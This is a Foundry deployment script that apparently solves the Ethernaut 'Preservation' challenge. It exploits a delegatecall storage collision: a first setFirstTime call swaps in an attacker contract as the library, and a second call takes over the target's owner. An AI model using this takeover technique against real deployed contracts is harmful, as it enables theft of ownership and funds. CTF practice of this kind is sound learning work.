// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import {Preservation, LibraryContract} from "../src/Preservation.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function run() public {
        uint256 deployerPrivteKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.rememberKey(deployerPrivteKey);

        vm.startBroadcast(deployer);

        Preservation preservation = Preservation(vm.envAddress("PRESERVATION"));
        Attack attack = new Attack();
        preservation.setFirstTime(uint256(uint160(address(attack))));
        preservation.setFirstTime(uint256(uint160(vm.envAddress("OWNER"))));
        assert(preservation.owner() == vm.envAddress("OWNER"));

        vm.stopBroadcast();
    }
}
